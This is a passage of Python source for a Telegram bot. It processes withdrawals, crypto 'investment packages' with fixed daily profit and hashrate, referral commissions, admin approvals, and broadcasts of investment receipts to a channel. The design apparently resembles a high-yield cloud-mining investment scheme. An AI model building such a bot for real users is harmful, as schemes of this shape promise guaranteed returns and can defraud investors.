        amount_usd = amount_afn / rate
        if amount_usd > user["profit"]: bot.send_message(m.chat.id, get_text(user, 'wd_err_balance')); return
        
        user["temp"] = amount_usd
        user["temp_afn"] = amount_afn
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Approve & Send Receipt", callback_data=f"wd_ok_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"wd_no_{uid}"))
        phone_info = f"\n📱 Mobile: {user.get('wd_phone', 'Not provided')}" if user.get('wd_phone') else ""
        
        bot.send_message(ADMIN_ID, f"""<b>📤 NEW WITHDRAWAL REQUEST (AFN)
👤 Name: {user['first_name']}
🆔 ID: {uid}
🏦 Method: {user['wd_type']}
{phone_info}
📍 Card/ID: {user['wd_addr']}
💰 Amount: {amount_afn} AFN (${round(amount_usd, 2)})</b>""", reply_markup=kb)
        
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, get_text(user, 'wd_sent'), reply_markup=main_menu(user)); return

    if user["step"] == "wd_amount":
        try: amount = float(text)
        except: bot.send_message(m.chat.id, "❌ Invalid number."); return
        if amount < MIN_WITHDRAW: bot.send_message(m.chat.id, get_text(user, 'wd_err_min')); return
        if amount > user["profit"]: bot.send_message(m.chat.id, get_text(user, 'wd_err_balance')); return
        user["temp"] = amount
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("✅ Approve & Send Receipt", callback_data=f"wd_ok_{uid}"), types.InlineKeyboardButton("❌ Reject", callback_data=f"wd_no_{uid}"))
        bot.send_message(ADMIN_ID, f"""<b>📤 NEW WITHDRAWAL REQUEST
👤 Name: {user['first_name']}
🆔 ID: {uid}
🏦 Method: {user['wd_type']}
📍 Address: {user['wd_addr']}
💰 Amount: ${amount}</b>""", reply_markup=kb)
        user["step"] = None; save(users)
        bot.send_message(m.chat.id, get_text(user, 'wd_sent'), reply_markup=main_menu(user)); return

# ==========================================
# CALLBACKS
# ==========================================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    users = load()
    uid = str(c.from_user.id)
    if uid not in users:
        users[uid] = {"balance": 0, "invested": 0, "profit": 0, "referral": 0, "daily_profit": 0, "package": "NONE", "last_profit": time.time(), "step": None, "temp": 0, "wd_type": "", "wd_addr": "", "wd_phone": "", "ref_by": None, "first_name": c.from_user.first_name, "username": c.from_user.username, "invest_time": 0, "hashrate": "0 GH/S", "lang": "fa", "temp_afn": 0}
        save(users)
    user = users[uid]
    user['id'] = int(uid)
    t_back = get_text(user, 'menu_back')

    if c.data == "check":
        if check_join(c.from_user.id):
            bot.answer_callback_query(c.id, "✅ Joined")
            bot.send_message(c.message.chat.id, get_text(user, 'welcome'), reply_markup=main_menu(user))
        else: bot.answer_callback_query(c.id, "❌ Join first")

    elif c.data == "back_to_main":
        users[uid]["step"] = None; save(users)
        bot.delete_message(c.message.chat.id, c.message.message_id)
        bot.send_message(uid, t_back, reply_markup=main_menu(user))

    elif c.data.startswith("wd_method_"):
        method = c.data.replace("wd_method_", "")
        users[uid]["wd_type"] = method
        users[uid]["wd_addr"] = ""; users[uid]["wd_phone"] = ""
        if "AFN" in method:
            users[uid]["step"] = "wd_phone"; save(users)
            bot.delete_message(c.message.chat.id, c.message.message_id)
            bot.send_message(uid, get_text(user, 'wd_phone'), reply_markup=back_menu(user))
        else:
            users[uid]["step"] = "wd_address"; save(users)
            bot.delete_message(c.message.chat.id, c.message.message_id)
            bot.send_message(uid, get_text(user, 'wd_addr'), reply_markup=back_menu(user))

    elif c.data.startswith("pkg_"):
        amount = int(c.data.split("_")[1])
        if amount in PACKAGES:
            users[uid]["temp"] = amount; users[uid]["step"] = "photo"; save(users)
            level, daily, hashrate = PACKAGES[amount]
            bot.send_message(uid, get_text(user, 'inv_selected', level=level, amount=amount, daily=daily, hashrate=hashrate, address=USDT_ADDRESS), reply_markup=back_menu(user))

    elif c.data.startswith("ok_"):
        target_uid = c.data.split("_")[1]
        t_user = users[target_uid]
        amount = t_user['temp']
        pkg_details = PACKAGES.get(amount)
        if pkg_details: pkg_name, daily, hashrate = pkg_details
        else: pkg_name, daily, hashrate = "UNKNOWN", 0, "0 GH/S"
        
        ref_id = t_user.get('ref_by')
        commission = 0
        if ref_id and ref_id in users:
            commission = amount * REFERRAL_COMMISSION_PERCENT
            users[ref_id]['profit'] += commission
            try: bot.send_message(ref_id, f"🎉 <b>REFERRAL COMMISSION!</b>\n\nUser <b>{t_user['first_name']}</b> invested ${amount}.\n💵 You earned ${round(commission, 2)} profit!")
            except: pass
        
        if t_user["package"] == "NONE":
            t_user["package"] = pkg_name; t_user["daily_profit"] = daily; t_user["invested"] = amount; t_user["hashrate"] = hashrate; t_user["invest_time"] = time.time() 
        else:
            t_user["package"] += f", {pkg_name}"; t_user["invested"] += amount; t_user["daily_profit"] += daily
            try:
                current_gh = int(t_user["hashrate"].split()[0]); new_gh = int(hashrate.split()[0])
                t_user["hashrate"] = f"{current_gh + new_gh} GH/S"
            except: t_user["hashrate"] += f" + {hashrate}"
        t_user["last_profit"] = time.time()
        
        try:
            receipt_image = generate_receipt_image(t_user, amount, pkg_name, daily)
            bot.send_photo(target_uid, receipt_image, caption=get_text(t_user, 'inv_approve', pkg=pkg_name, amt=amount))
            receipt_image.seek(0) 
            try: bot.send_photo(CHANNEL, receipt_image, caption=f"""<b>🔥 NEW INVESTMENT 🔥\n\n👤 Investor: {t_user['first_name']}\n📦 Package: {pkg_name}\n💰 Amount: ${amount}\n📈 Daily: ${daily}\n\nJoin: @{BOT_USERNAME}</b>""")
            except Exception as e: bot.send_message(ADMIN_ID, f"⚠️ Channel Error: {e}")
            bot.answer_callback_query(c.id, "Approved & Receipt Sent")
            try: bot.edit_message_text("✅ Approved", c.message.chat.id, c.message.message_id)
            except: pass
        except Exception as e:
            print(f"Error: {e}")
            bot.send_message(target_uid, get_text(t_user, 'inv_approve', pkg=pkg_name, amt=amount))
        save(users)

    elif c.data.startswith("no_"):
        target_uid = c.data.split("_")[1]
        bot.send_message(target_uid, get_text(users[target_uid], 'inv_reject'))
        try: bot.edit_message_text("❌ Rejected", c.message.chat.id, c.message.message_id)
        except: pass

    elif c.data.startswith("wd_ok_"):
        target_uid = c.data.split("_")[2]
        users[str(ADMIN_ID)]["step"] = f"receipt_{target_uid}"; save(users)
        bot.send_message(ADMIN_ID, f"✅ Withdrawal for {users[target_uid]['first_name']} approved.\n📸 Please send the RECEIPT PHOTO now.")
        try: bot.edit_message_text("⏳ Awaiting Receipt Photo...", c.message.chat.id, c.message.message_id)
        except: pass

    elif c.data.startswith("wd_no_"):
        target_uid = c.data.split("_")[2]
        bot.send_message(target_uid, "❌ Withdrawal rejected")
        try: bot.edit_message_text("❌ Rejected", c.message.chat.id, c.message.message_id)
        except: pass

    elif c.data.startswith("reply_"):
        target_uid = c.data.split("_")[1]
        users[str(ADMIN_ID)]["step"] = f"reply_{target_uid}"; save(users)
        bot.send_message(ADMIN_ID, "📩 Send reply")

# ==========================================
# RUN BOT
# ==========================================
print("🔥 BOT STARTING...")
print("⚠️ Ensure 'assets' folder exists with optimized images (small file size)")
threading.Thread(target=night_message).start()
bot.infinity_polling()